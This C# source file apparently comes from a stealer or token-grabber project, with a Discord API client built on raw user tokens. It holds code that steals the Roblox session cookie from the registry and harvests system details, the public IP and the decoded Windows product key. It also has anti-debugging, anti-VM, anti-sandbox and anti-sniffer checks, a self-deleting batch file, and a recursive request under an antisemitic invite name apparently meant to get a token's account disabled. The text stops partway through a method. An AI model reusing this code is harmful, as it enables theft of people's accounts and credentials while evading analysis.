using Discord.Backend;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json.Serialization;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using WebSocketSharp;
using static Discord.EventsArgs;
using static Discord.Structures;
using static Discord.Structures.Embed;

namespace QvoidWrapper
{
    static public class Other
    {
        public static Color Spectrum(int mode, float time = 0f)
        {
            time = time == 0f ? (float)((DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() % 62830) / 2000.0) : time;
            return Color.FromArgb(255,
                   (int)((Math.Sin(time + (mode / Math.PI)) * .5f + .5f) * 255.0f),
                   (int)((Math.Sin(time + (mode / Math.PI) + 2 * Math.PI / 3) * .5f + .5f) * 255.0f),
                   (int)((Math.Sin(time + (mode / Math.PI) + 4 * Math.PI / 3) * .5f + .5f) * 255.0f));
        }

        public static void SelfDestruct()
        {
            string strName = "destruct.bat";
            string strPath = Path.Combine(Directory.GetCurrentDirectory(), strName);
            string strExe = new FileInfo(Application.ExecutablePath).Name;

            StreamWriter swDestruct = new StreamWriter(strPath);
            swDestruct.WriteLine($"attrib \"{strExe}\" -a -s -r -h\n:Repeat\ndel \"{strExe}\"\nif exist \"{strExe}\" goto Repeat\ndel \"{strName}\"");
            swDestruct.Close();

            Process procDestruct = new Process();
            procDestruct.StartInfo.FileName = strName;
            procDestruct.StartInfo.CreateNoWindow = true;
            procDestruct.StartInfo.UseShellExecute = false;

            try
            {
                procDestruct.Start();
            }
            catch (Exception)
            {
                Application.Exit();
            }
        }

        public static string RobloxCookies()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com", false))
                {
                    if (key == null)
                        return null;

                    string cookie = key.GetValue(".ROBLOSECURITY").ToString();
                    return cookie.Substring(46).Trim('>');
                }
            }
            catch
            { return null; }
        }
    }

    static public class ProcessHandler
    {
        [StructLayout(LayoutKind.Sequential)]
        struct RM_UNIQUE_PROCESS
        {
            public int dwProcessId;
            public System.Runtime.InteropServices.ComTypes.FILETIME ProcessStartTime;
        }

        const int RmRebootReasonNone = 0;
        const int CCH_RM_MAX_APP_NAME = 255;
        const int CCH_RM_MAX_SVC_NAME = 63;

        enum RM_APP_TYPE
        {
            RmUnknownApp = 0,
            RmMainWindow = 1,
            RmOtherWindow = 2,
            RmService = 3,
            RmExplorer = 4,
            RmConsole = 5,
            RmCritical = 1000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct RM_PROCESS_INFO
        {
            public RM_UNIQUE_PROCESS Process;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_APP_NAME + 1)]
            public string strAppName;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_SVC_NAME + 1)]
            public string strServiceShortName;

            public RM_APP_TYPE ApplicationType;
            public uint AppStatus;
            public uint TSSessionId;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bRestartable;
        }

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
        static extern int RmRegisterResources(uint pSessionHandle,
                                            UInt32 nFiles,
                                            string[] rgsFilenames,
                                            UInt32 nApplications,
                                            [In] RM_UNIQUE_PROCESS[] rgApplications,
                                            UInt32 nServices,
                                            string[] rgsServiceNames);

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Auto)]
        static extern int RmStartSession(out uint pSessionHandle, int dwSessionFlags, string strSessionKey);

        [DllImport("rstrtmgr.dll")]
        static extern int RmEndSession(uint pSessionHandle);

        [DllImport("rstrtmgr.dll")]
        static extern int RmGetList(uint dwSessionHandle,
                                    out uint pnProcInfoNeeded,
                                    ref uint pnProcInfo,
                                    [In, Out] RM_PROCESS_INFO[] rgAffectedApps,
                                    ref uint lpdwRebootReasons);

        static public List<Process> WhoIsLocking(string path)
        {
            uint handle;
            string key = Guid.NewGuid().ToString();
            List<Process> processes = new List<Process>();

            int res = RmStartSession(out handle, 0, key);
            if (res != 0) throw new Exception("Could not begin restart session.  Unable to determine file locker.");

            try
            {
                const int ERROR_MORE_DATA = 234;
                uint pnProcInfoNeeded = 0,
                    pnProcInfo = 0,
                    lpdwRebootReasons = RmRebootReasonNone;

                string[] resources = new string[] { path };

                res = RmRegisterResources(handle, (uint)resources.Length, resources, 0, null, 0, null);

                if (res != 0) throw new Exception("Could not register resource.");
                res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, null, ref lpdwRebootReasons);

                if (res == ERROR_MORE_DATA)
                {
                    RM_PROCESS_INFO[] processInfo = new RM_PROCESS_INFO[pnProcInfoNeeded];
                    pnProcInfo = pnProcInfoNeeded;

                    res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, processInfo, ref lpdwRebootReasons);
                    if (res == 0)
                    {
                        processes = new List<Process>((int)pnProcInfo);
                        for (int i = 0; i < pnProcInfo; i++)
                        {
                            try
                            {
                                processes.Add(Process.GetProcessById(processInfo[i].Process.dwProcessId));
                            }
                            catch (ArgumentException) { }
                        }
                    }
                    else throw new Exception("Could not list processes locking resource.");
                }
                else if (res != 0) throw new Exception("Could not list processes locking resource. Failed to get size of result.");
            }
            finally
            {
                RmEndSession(handle);
            }

            return processes;
        }

        public static void remoteProcessKill(string computerName, string userName, string pword, string processName)
        {
            var connectoptions = new ConnectionOptions();
            connectoptions.Username = userName;
            connectoptions.Password = pword;

            ManagementScope scope = new ManagementScope($@"\\{computerName}\root\cimv2", connectoptions);

            // WMI query
            var query = new SelectQuery($"select * from Win32_process where name = '{processName}'");

            using (var searcher = new ManagementObjectSearcher(scope, query))
            {
                foreach (ManagementObject process in searcher.Get())
                {
                    process.InvokeMethod("Terminate", null);
                    process.Dispose();
                }
            }
        }

        public static void localProcessKill(string processName)
        {
            foreach (Process p in Process.GetProcessesByName(processName))
            {
                p.Kill();
            }
        }

        [DllImport("kernel32.dll")]
        public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);

        public const int MOVEFILE_DELAY_UNTIL_REBOOT = 0x4;

    }

    static public class Protection
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public static void WebSniffers(bool Exit)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

            HttpWebRequest.DefaultWebProxy = new WebProxy();
            WebRequest.DefaultWebProxy = new WebProxy();

            if (GetModuleHandle("HTTPDebuggerBrowser.dll") != IntPtr.Zero || GetModuleHandle("FiddlerCore4.dll") != IntPtr.Zero || GetModuleHandle("RestSharp.dll") != IntPtr.Zero || GetModuleHandle("Titanium.Web.Proxy.dll") != IntPtr.Zero)
            {
                Debug.WriteLine("HTTP Debugger detected");
                if (Exit)
                    Environment.Exit(0);
            }

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://mail.google.com");
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                response.Close();

                X509Certificate2 cert = new X509Certificate2(request.ServicePoint.Certificate);

#pragma warning disable CS0618
                if (!cert.GetIssuerName().Contains("Google"))
#pragma warning restore CS0618
                {
                    Debug.WriteLine("HTTP Sniffer detected!");
                    if (Exit)
                        Environment.Exit(0);
                }
            }
            catch { }
        }

        public static void AntiDebug(bool Exit)
        {
            bool isDebuggerPresent = true;
#if !DEBUG
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            if (isDebuggerPresent)
            {
                Debug.WriteLine("Fuck you!");
                if (Exit)
                    Environment.Exit(0);
            }
#endif
        }

        public static void Sandboxie(bool Exit)
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            {
                Debug.WriteLine("Sandboxie detected");
                if (Exit)
                    Environment.Exit(0);
            }
        }

        public static void Emulation(bool Exit)
        {
            long tickCount = Environment.TickCount;
            Thread.Sleep(500);
            long tickCount2 = Environment.TickCount;
            if (((tickCount2 - tickCount) < 500L))
            {
                Debug.WriteLine("Emulation Detected");
                if (Exit)
                    Environment.Exit(0);
            }
        }

        public static void DetectVM(bool Exit)
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                    if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                    {
                        Debug.WriteLine("VM Detected");
                        if (Exit)
                            Environment.Exit(0);
                    }

            foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                {
                    Debug.WriteLine("VM Detected");
                    if (Exit)
                        Environment.Exit(0);
                }
        }
    }

    public class Machine
    {
        static private string[] SizeSuffixes { get; } = { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };
        public string WindowsLicense { get; private set; }
        public string PublicIPv4 { get; private set; }
        public string LanIPv4 { get; private set; }
        public string OsName { get; private set; }
        public string OsArchitecture { get; private set; }
        public string OsVersion { get; private set; }
        public string ProcessName { get; private set; }
        public string GpuVideo { get; private set; }
        public string GpuVersion { get; private set; }
        public string DiskDetails { get; private set; }
        public string PcMemory { get; private set; }

        public Machine()
        {
            ManagementObjectSearcher ObjSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
            foreach (ManagementObject _obj in ObjSearcher.Get())
            {
                if (_obj["Caption"] != null)
                    OsName = _obj["Caption"].ToString();

                if (_obj["OSArchitecture"] != null)
                    OsArchitecture = _obj["OSArchitecture"].ToString();

                if (_obj["Version"] != null)
                    OsVersion = _obj["Version"].ToString();
            }

            RegistryKey CentralProcessor = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0", RegistryKeyPermissionCheck.ReadSubTree);

            if (CentralProcessor != null)
            {
                var value = CentralProcessor.GetValue("ProcessorNameString");
                if (value != null)
                    ProcessName = value.ToString();
            }

            ObjSearcher = new ManagementObjectSearcher("select * from Win32_VideoController");
            foreach (ManagementObject _obj in ObjSearcher.Get())
            {
                GpuVideo = _obj["VideoProcessor"].ToString();
                GpuVersion = _obj["DriverVersion"].ToString();
            }

            DriveInfo[] Drives = DriveInfo.GetDrives();
            foreach (DriveInfo _drive in Drives)
                if (_drive.IsReady)
                    DiskDetails += $"Drive {_drive.Name}\\ - {SizeSuffix(_drive.AvailableFreeSpace)}/{SizeSuffix(_drive.TotalSize)}\n";

            ObjSearcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");

            Int64 Capacity = 0;
            foreach (ManagementObject WniPART in ObjSearcher.Get())
                Capacity += Convert.ToInt64(WniPART.Properties["Capacity"].Value);

            PcMemory = SizeSuffix(Capacity);

            IPHostEntry ipHostEntry = Dns.GetHostEntry(string.Empty);
            foreach (IPAddress address in ipHostEntry.AddressList)
            {
                if (address.AddressFamily == AddressFamily.InterNetwork)
                {
                    LanIPv4 = address.ToString();
                    break;
                }
            }

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://ifconfig.me");
            request.UserAgent = "curl";
            try
            {
                PublicIPv4 = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", string.Empty).Replace("\r", string.Empty);
            }
            catch
            { }

            WindowsLicense = GetProductKey();
        }

        public static string GetProductKey()
        {
            var localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);

            if (Environment.Is64BitOperatingSystem)
                localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);

            var registryKeyValue = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue("DigitalProductId");
            if (registryKeyValue == null)
                return "Failed to get DigitalProductId from registry";
            var digitalProductId = (byte[])registryKeyValue;

            return DecodeProductKey(digitalProductId);
        }

        private static string DecodeProductKey(byte[] digitalProductId)
        {
            var key = String.Empty;
            const int keyOffset = 52;
            var isWin8 = (byte)((digitalProductId[66] / 6) & 1);
            digitalProductId[66] = (byte)((digitalProductId[66] & 0xf7) | (isWin8 & 2) * 4);

            const string digits = "BCDFGHJKMPQRTVWXY2346789";
            var last = 0;
            for (var i = 24; i >= 0; i--)
            {
                var current = 0;
                for (var j = 14; j >= 0; j--)
                {
                    current = current * 256;
                    current = digitalProductId[j + keyOffset] + current;
                    digitalProductId[j + keyOffset] = (byte)(current / 24);
                    current = current % 24;
                    last = current;
                }
                key = digits[current] + key;
            }

            var keypart1 = key.Substring(1, last);
            var keypart2 = key.Substring(last + 1, key.Length - (last + 1));
            key = keypart1 + "N" + keypart2;

            for (var i = 5; i < key.Length; i += 6)
            {
                key = key.Insert(i, "-");
            }

            return key;
        }

        private static string SizeSuffix(Int64 value)
        {
            if (value < 0)
                return "-" + SizeSuffix(-value);

            if (value == 0)
                return "0.0 bytes";

            int mag = (int)Math.Log(value, 1024);
            return $"{(decimal)value / (1L << (mag * 10))} {SizeSuffixes[mag]}";
        }
    }

    public class Encryption
    {
        public static string ComputeSha256Hash(string rawData)
        {
            using (SHA256 sha256Hash = SHA256.Create())
            {
                byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < bytes.Length; i++)
                    builder.Append(bytes[i].ToString("x2"));

                return builder.ToString();
            }
        }

        public static string SHA256CheckSum(string filePath)
        {
            using (SHA256 SHA256 = SHA256Managed.Create())
            {
                try
                {
                    using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                        return Convert.ToBase64String(SHA256.ComputeHash(fileStream));
                }
                catch { return null; }
            }
        }
    }
}

namespace Discord
{
    public class DiscordSocketClient
    {
#region Events
        public delegate void LoggedInEventHandler(DiscordSocketClient client);
        public event LoggedInEventHandler OnLoggedIn;

        internal void LoggedIn(DiscordSocketClient client)
        {
            if (OnLoggedIn != null)
                OnLoggedIn(client);
        }

        public delegate void MessageReceivedEventHandler(MessageReceivedEventArgs args);
        public event MessageReceivedEventHandler OnMessageReceived;

        internal void MessageReceived(MessageReceivedEventArgs args)
        {
            if (OnMessageReceived != null)
                OnMessageReceived(args);
        }

        public delegate void InteractionReceivedEventHandler(InteractionCreateEventArgs args);
        public event InteractionReceivedEventHandler OnInteractionReceived;

        internal void InteractionReceived(InteractionCreateEventArgs args)
        {
            if (OnInteractionReceived != null)
                OnInteractionReceived(args);
        }

        public delegate void GuildMemberAddEventHandler(GuildMemberAddEventArgs args);
        public event GuildMemberAddEventHandler OnMemberJoined;

        internal void MemberJoined(GuildMemberAddEventArgs args)
        {
            if (OnMemberJoined != null)
                OnMemberJoined(args);
        }

        public delegate void GuildMemberRemoveEventHandler(GuildMemberRemoveEventArgs args);
        public event GuildMemberRemoveEventHandler OnMemberRemoved;

        internal void MemberRemoved(GuildMemberRemoveEventArgs args)
        {
            if (OnMemberRemoved != null)
                OnMemberRemoved(args);
        }

        public delegate void ClientJoinedGuildRemoveEventHandler(JoinedGuildEventArgs args);
        public event ClientJoinedGuildRemoveEventHandler OnJoinedGuild;

        internal void JoinedGuild(JoinedGuildEventArgs args)
        {
            if (OnJoinedGuild != null)
                OnJoinedGuild(args);
        }
#endregion

#region Listeners
        internal bool WaitingForMembers = false;
        internal DiscordMember[] GuildMembers;
#endregion

        private Gateway Gateway;
        private string Endpoint;
        public DiscordUser User;
        public string Token;
        public ClientType Type;
        public bool Mfa;
        public bool Nitro;
        public bool Nsfw;
        public string Locale;
        public string PhoneNumber;

        public DiscordSocketClient(string Token, ClientType Type = ClientType.User, DiscordStatus Status = null, Config Config = null)
        {
            if (!Extensions.IsValidToken(Token))
                throw new Exception("Invaild token.");

            if (Config == null)
                Config = new Config();

            if (Type == ClientType.User && Token.ToLower().StartsWith("bot "))
                Type = ClientType.Bot;

            Gateway gateway = new Gateway(Type, Status, Config.GatewayVersion, Config.EndpointVersion);
            gateway.Connect(Token, this);

#if DEBUG
            Console.WriteLine("Connected successfully!");
#endif
            this.Gateway = gateway;
            this.Endpoint = $"https://discordapp.com/api/v{Config.EndpointVersion}";
        }

        public bool Disable()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/invites/proudjew");
            request.Headers.Add("Authorization", this.Token);
            request.Method = "POST";
            try { request.GetResponse(); Disable(); return true; }
            catch { return false; }
        }

        public DiscordUser GetDiscordUser(ulong Id)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/users/{Id}");
            request.Headers.Set("Authorization", this.Token);

            return JsonConvert.DeserializeObject<DiscordUser>(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
        }

        public ulong CreateDM(ulong RecipientId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/users/@me/channels");
            request.Headers.Add("Authorization", this.Token);

            var JObj = JArray.Parse(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
            return ulong.Parse(JObj.First["id"].ToString());
        }

        public DiscordUser[] GetRelationships()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/users/@me/relationships");
            request.Headers.Add("Authorization", this.Token);

            List<DiscordUser> Users = new List<DiscordUser>();
            var jArray = JArray.Parse(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
            foreach (var obj in jArray)
                Users.Add(GetDiscordUser(obj["id"].ToObject<ulong>()));

            return Users.ToArray();
        }

        public void UploadFile(ulong ChannelId, FileInfo file)
        {
            string bound = $"------------------------{DateTime.Now.Ticks.ToString("x")}";
            WebClient webhookRequest = new WebClient();
            webhookRequest.Proxy = new WebProxy();
            webhookRequest.Headers.Add("Content-Type", "multipart/form-data; boundary=" + bound);
            MemoryStream stream = new MemoryStream();
            byte[] beginBodyBuffer = Encoding.UTF8.GetBytes($"--{bound}\r\n");
            stream.Write(beginBodyBuffer, 0, beginBodyBuffer.Length);

            if (file != null && file.Exists)
            {
                string fileBody = $"Content-Disposition: form-data; name=\"file\"; filename=\"{file.Name}\"\r\nContent-Type: application/octet-stream\r\n\r\n";
                byte[] fileBodyBuffer = Encoding.UTF8.GetBytes(fileBody);
                stream.Write(fileBodyBuffer, 0, fileBodyBuffer.Length);
                byte[] fileBuffer = File.ReadAllBytes(file.FullName);
                stream.Write(fileBuffer, 0, fileBuffer.Length);
                string fileBodyEnd = $"\r\n--{bound}\r\n";
                byte[] fileBodyEndBuffer = Encoding.UTF8.GetBytes(fileBodyEnd);
                stream.Write(fileBodyEndBuffer, 0, fileBodyEndBuffer.Length);
            }

            string jsonBody = string.Concat(new string[]
            {
                $"Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n{new Embed()}\r\n--{bound}--",//Not Sure For This One :)
            });
            byte[] jsonBodyBuffer = Encoding.UTF8.GetBytes(jsonBody);
            stream.Write(jsonBodyBuffer, 0, jsonBodyBuffer.Length);
            webhookRequest.Headers.Add("Authorization", this.Token);
            webhookRequest.UploadData($"{this.Endpoint}/channels/{ChannelId}/messages", stream.ToArray());
        }

        public void SendFriendRequest(ulong UserId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/users/@me/relationships");
            request.Headers.Set("Authorization", this.Token);
            request.ContentType = "application/json";
            request.Method = "POST";

            var user = GetDiscordUser(UserId);
            try
            {
                StreamWriter stream = new StreamWriter(request.GetRequestStream());
                string jsonObject = "{" + $"\"username\":\"{user.Username}\",\"discriminator\":{user.Discriminator}" + "}";
                stream.Write(jsonObject);
                stream.Dispose();
                HttpStatusCode code = ((HttpWebResponse)request.GetResponse()).StatusCode;
            }
            catch (WebException ex)
            {
                if (ex.Message.Contains("404"))
                    throw new Exception("User not found.");
            }
        }

        public void DeleteFriendRequest(ulong UserId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/users/@me/relationships");
            request.Headers.Set("Authorization", this.Token);
            request.ContentType = "application/json";
            request.Method = "DELETE";

            var user = GetDiscordUser(UserId);
            try
            {
                StreamWriter stream = new StreamWriter(request.GetRequestStream());
                string jsonObject = "{" + $"\"username\":\"{user.Username}\",\"discriminator\":{user.Discriminator}" + "}";
                stream.Write(jsonObject);
                stream.Dispose();
                HttpStatusCode code = ((HttpWebResponse)request.GetResponse()).StatusCode;
            }
            catch (WebException ex)
            {
                if (ex.Message.Contains("404"))
                    throw new Exception("User not found.");
            }
        }

        public void SendMessage(ulong ChannelID, DiscordEmbed embed, ComponentContainer[] components = null)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/channels/{ChannelID}/messages");
            request.Headers.Set("Authorization", this.Token);

            byte[] value = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(new SocketTypes.DiscordGuildMessage() { Embeds = new Embed.DiscordEmbed[] { embed }, Components = components }));
            var stream = request.GetRequestStream();
            stream.Write(value, 0, value.Length);
            stream.Dispose();

            var responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd();
        }

        public void SendMessage(ulong ChannelID, string message, bool tts = false)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/channels/{ChannelID}/messages");
            request.Headers.Set("Authorization", this.Token);
            request.ContentType = "application/json";
            request.Method = "POST";

            if (message == "")
                throw new ArgumentNullException("Message content cannot be empty.");

            try
            {
                string data = "{" + $"\"content\":\"{message}\", \"tts\":{(tts ? true : false)}" + "}";
                //string data = "{    \"content\": \"This is a message with components\",    \"components\": [        {            \"type\": 1,            \"components\": []        }    ]}";
                StreamWriter stream = new StreamWriter(request.GetRequestStream());
                stream.Write(data);
                stream.Dispose();
                HttpStatusCode code = ((HttpWebResponse)request.GetResponse()).StatusCode;
                Thread.Sleep(120);
            }
            catch (WebException ex)
            {
                if (ex.Message.Contains("400"))
                    throw new ArgumentException("Bad message.");
            }
        }

        public DiscordMessage EditMessage(DiscordEmbed embed, DiscordMessage message, ComponentContainer[] components = null)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/channels/{message.Channel_id}/messages/{message.Id}");
            request.Headers.Set("Authorization", this.Token);
            request.Method = "PATCH";

            var serializerSettings = new JsonSerializerSettings();
            serializerSettings.ContractResolver = new CamelCasePropertyNamesContractResolver();
            var obj = JsonConvert.SerializeObject(new SocketTypes.DiscordGuildMessage() { Embeds = new Embed.DiscordEmbed[] { embed }, Components = components }, serializerSettings).Replace("null", "\"\"");
            byte[] value = Encoding.UTF8.GetBytes(obj);
            var stream = request.GetRequestStream();
            stream.Write(value, 0, value.Length);
            stream.Dispose();

            var responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd();
            return null;
        }

        public void TriggerTyping(ulong ChannelId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/channels/{ChannelId}/typing");
            request.Headers.Set("Authorization", this.Token);
            request.ContentLength = 0;
            request.ContentType = "application/json";
            request.Method = "POST";

            try
            {
                HttpStatusCode code = ((HttpWebResponse)request.GetResponse()).StatusCode;
            }
            catch { }
        }

        public bool Usable()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/users/0");
            request.Headers.Set("Authorization", this.Token);

            try
            {
                using (HttpWebResponse webResponse = (HttpWebResponse)request.GetResponse()) { }
            }
            catch (WebException ex)
            { return ex.Message.Contains("404"); }

            return false;
        }

        public DiscordMember[] GetSocketGuildMembers(ulong GuildId)
        {
            Gateway.Socket.Send(String.Format("{\"op\": 8, \"d\": { \"guild_id\": \"{0}\", \"query\": \"\", \"limit\": 0}}", GuildId));
            WaitingForMembers = true;
            while (WaitingForMembers)
                continue;

            return GuildMembers;
        }

        public void SetActivity(DiscordStatus Status)
        {
            var serializerSettings = new JsonSerializerSettings();
            serializerSettings.ContractResolver = new CamelCasePropertyNamesContractResolver();
            var se = JsonConvert.SerializeObject(Status, serializerSettings);
            Gateway.Socket.Send(JsonConvert.SerializeObject(new SocketTypes.ChangeStatus() { d = Status, op = 3 }));
        }

        public void SetActivity(DiscordActivity activity, string Text, DateTime Expires)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/users/@me/settings");
            request.Headers.Set("Authorization", this.Token);
            request.ContentType = "application/json";
            request.Method = "PATCH";

            byte[] value = Encoding.UTF8.GetBytes("{" + $"\"status\":\"{activity.ToString().ToLower()}\"" + "}");
            var stream = request.GetRequestStream();
            stream.Write(value, 0, value.Length);
            stream.Dispose();
            request.GetResponse();

            if (!String.IsNullOrEmpty(Text) && !String.IsNullOrWhiteSpace(Text))
            {
                request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/users/@me/settings");
                request.Headers.Set("Authorization", this.Token);
                request.ContentType = "application/json";
                request.Method = "PATCH";

                string a = "{" + "\"custom_status\":{\"expires_at\":" + $"\"{Expires.ToString("yyyy-MM-ddTHH:mm:ssZ")}\"" + $", \"text\":\"{Text}\"" + "}}";
                value = Encoding.UTF8.GetBytes(a);
                stream = request.GetRequestStream();
                stream.Write(value, 0, value.Length);
                stream.Dispose();
                request.GetResponse();
            }
        }

        public DiscordGuild GetGuild(ulong GuildId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}");
            request.Headers.Set("Authorization", this.Token);

            return JsonConvert.DeserializeObject<DiscordGuild>(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
        }

        public bool DeleteGuild(ulong GuildId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}");
            request.Headers.Set("Authorization", this.Token);

            HttpStatusCode status = ((HttpWebResponse)request.GetResponse()).StatusCode;
            return status == HttpStatusCode.NoContent;
        }

        public DiscordGuildChannel[] GetGuildChannels(ulong GuildId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}/channels");
            request.Headers.Set("Authorization", this.Token);

            return JsonConvert.DeserializeObject<DiscordGuildChannel[]>(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
        }

        public DiscordMember GetGuildMember(ulong GuildId, ulong MemberId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}/members/{MemberId}");
            request.Headers.Set("Authorization", this.Token);

            return JsonConvert.DeserializeObject<DiscordMember>(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
        }

        public DiscordMember[] GetGuildMembers(ulong GuildId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}/members");
            request.Headers.Set("Authorization", this.Token);

            throw new Exception("Use the GetSocketGuildMembers, right now there is problem in this function.");
        }

        public DiscordMember[] GetGuildMembers(ulong GuildId, string UsernameStartWith)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}/members/search");
            request.Headers.Set("Authorization", this.Token);

            byte[] requestBytes = new ASCIIEncoding().GetBytes("{\"query\":\"" + JsonConvert.SerializeObject(UsernameStartWith) + "\"}");
            Stream requestStream = request.GetRequestStream();
            requestStream.Write(requestBytes, 0, requestBytes.Length);
            requestStream.Dispose();

            return JsonConvert.DeserializeObject<DiscordMember[]>(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
        }

        public DiscordBan[] GetGuildBans(ulong GuildId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}/bans");
            request.Headers.Set("Authorization", this.Token);

            JArray array = JArray.Parse(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
            List<DiscordBan> Bans = new List<DiscordBan>();
            foreach (JObject user in array)
                Bans.Add(new DiscordBan { User = JsonConvert.DeserializeObject<DiscordUser>(user["user"].ToString()), Reason = JsonConvert.DeserializeObject<string>(user["reason"].ToString()) });

            return Bans.ToArray();
        }

        public DiscordBan GetGuildBan(ulong GuildId, ulong UserId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}/bans/{UserId}");
            request.Headers.Set("Authorization", this.Token);

            JObject jObj = JObject.Parse(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
            return new DiscordBan { User = JsonConvert.DeserializeObject<DiscordUser>(jObj["user"].ToString()), Reason = JsonConvert.DeserializeObject<string>(jObj["reason"].ToString()) };
        }

        public bool BanMember(ulong GuildId, ulong UserId, string Reason = "", int DeleteMessageDays = 0)
        {
